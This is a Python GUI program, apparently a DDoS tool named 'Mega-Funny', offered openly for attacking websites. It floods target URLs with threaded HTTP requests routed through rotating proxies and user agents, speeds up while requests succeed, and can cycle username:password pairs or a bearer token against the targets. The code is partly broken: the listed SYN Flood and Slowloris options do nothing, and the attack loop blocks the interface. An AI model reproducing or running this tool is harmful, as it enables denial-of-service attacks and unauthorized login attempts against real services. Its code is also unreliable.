import tkinter as tk
from tkinter import messagebox
import requests
import threading
import random
import time
from itertools import cycle

class DDoSAttackGUI:
    def __init__(self, master):
        self.master = master
        master.title("Mega-Funny")
        
        # Header and Footer
        self.header_label = tk.Label(master, text="Mega-Funny", font=("Helvetica", 16))
        self.header_label.pack()
        
        self.footer_label = tk.Label(master, text="built by Deadman", font=("Helvetica", 10))
        self.footer_label.pack(side="bottom")
        
        # Create input fields for target URL, number of requests, and threads
        self.target_url_label = tk.Label(master, text="Target URLs (comma-separated):")
        self.target_url_label.pack()
        self.target_url_entry = tk.Entry(master, width=50)
        self.target_url_entry.pack()

        self.num_requests_label = tk.Label(master, text="Number of Requests per Thread (must-use):")
        self.num_requests_label.pack()
        self.num_requests_entry = tk.Entry(master, width=50)
        self.num_requests_entry.pack()

        self.threads_label = tk.Label(master, text="Number of Threads (must-use):")
        self.threads_label.pack()
        self.threads_entry = tk.Entry(master, width=50)
        self.threads_entry.pack()

        self.proxies_label = tk.Label(master, text="Proxies (optional, comma-separated):")
        self.proxies_label.pack()
        self.proxies_entry = tk.Entry(master, width=50)
        self.proxies_entry.pack()

        self.user_agents_label = tk.Label(master, text="User Agents (optional, comma-separated):")
        self.user_agents_label.pack()
        self.user_agents_entry = tk.Entry(master, width=50)
        self.user_agents_entry.pack()

        self.login_attempts_label = tk.Label(master, text="Login Attempts (optional, username:password, comma-separated):")
        self.login_attempts_label.pack()
        self.login_attempts_entry = tk.Entry(master, width=50)
        self.login_attempts_entry.pack()

        self.token_attack_label = tk.Label(master, text="Token Attack (optional, token):")
        self.token_attack_label.pack()
        self.token_attack_entry = tk.Entry(master, width=50)
        self.token_attack_entry.pack()

        self.interval_label = tk.Label(master, text="Request Interval (optional, seconds):")
        self.interval_label.pack()
        self.interval_entry = tk.Entry(master, width=50)
        self.interval_entry.pack()

        self.duration_label = tk.Label(master, text="Attack Duration (optional, seconds, 0 for continuous):")
        self.duration_label.pack()
        self.duration_entry = tk.Entry(master, width=50)
        self.duration_entry.pack()

        self.attack_vector_label = tk.Label(master, text="Attack Vector (optional, HTTP Flood, SYN Flood, Slowloris):")
        self.attack_vector_label.pack()
        self.attack_vector_entry = tk.Entry(master, width=50)
        self.attack_vector_entry.pack()

        # Create start and stop buttons
        self.start_button = tk.Button(master, text="Start Attack", command=self.start_attack)
        self.start_button.pack()
        self.stop_button = tk.Button(master, text="Stop Attack", command=self.stop_attack)
        self.stop_button.pack()

        self.attack_running = False

    def start_attack(self):
        self.attack_running = True
        while self.attack_running:
            # Get input values from GUI
            target_urls = [url.strip() for url in self.target_url_entry.get().split(",")]
            num_requests = int(self.num_requests_entry.get())
            threads = int(self.threads_entry.get())
            proxies = [proxy.strip() for proxy in self.proxies_entry.get().split(",") if proxy.strip()]
            user_agents = [user_agent.strip() for user_agent in self.user_agents_entry.get().split(",") if user_agent.strip()]
            login_attempts = [attempt.strip() for attempt in self.login_attempts_entry.get().split(",") if attempt.strip()]
            token_attack = self.token_attack_entry.get()
            interval = float(self.interval_entry.get()) if self.interval_entry.get() else 0.0
            duration = int(self.duration_entry.get()) if self.duration_entry.get() else 0
            attack_vector = self.attack_vector_entry.get() if self.attack_vector_entry.get() else "HTTP Flood"

            # Start the attack
            self.attack(target_urls, num_requests, threads, proxies, user_agents, login_attempts, token_attack, interval, duration, attack_vector)
            time.sleep(5)  # Sleep for 5 seconds before starting the next attack

    def stop_attack(self):
        self.attack_running = False

    def attack(self, target_urls, num_requests, threads, proxies, user_agents, login_attempts, token_attack, interval, duration, attack_vector):
        end_time = time.time() + duration if duration > 0 else float('inf')
        target_cycle = cycle(target_urls)
        proxy_cycle = cycle(proxies)
        
        def adaptive_control(successful_requests, failed_requests):
            if successful_requests > failed_requests:
                return max(0.001, interval - 0.001)  # Decrease interval if more successful
            else:
                return interval + 0.001  # Increase interval if more failed

        def thread_function(target_url, proxy):
            successful_requests = 0
            failed_requests = 0
            for _ in range(num_requests):
                if not self.attack_running or time.time() > end_time:
                    break
                try:
                    user_agent = random.choice(user_agents)
                    headers = {"User-Agent": user_agent}
                    if login_attempts:
                        username, password = random.choice(login_attempts).split(":")
                        auth = (username, password)
                        response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy}, auth=auth)
                    elif token_attack:
                        headers["Authorization"] = f"Bearer {token_attack}"
                        response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy})
                    else:
                        response = requests.get(target_url, headers=headers, proxies={"http": proxy, "https": proxy})

                    if response.status_code == 200:
                        successful_requests += 1
                    else:
                        failed_requests += 1

                    print(f"Request to {target_url} sent! (Proxy: {proxy})")
                    time.sleep(adaptive_control(successful_requests, failed_requests))
                except Exception as e:
                    print(f"Error: {e}")
                    failed_requests += 1

            print(f"Thread for {target_url} finished.")

        # Create threads to send requests concurrently
        threads_list = []
        for _ in range(threads):
            target_url = next(target_cycle)
            proxy = next(proxy_cycle)
            t = threading.Thread(target=thread_function, args=(target_url, proxy))
            threads_list.append(t)
            t.start()

        # Wait for all threads to finish or until duration ends
        for t in threads_list:
            t.join()

        self.attack_running = False
        messagebox.showinfo("Mega-Funny", "Attack completed!")

root = tk.Tk()
my_gui = DDoSAttackGUI(root)
root.mainloop()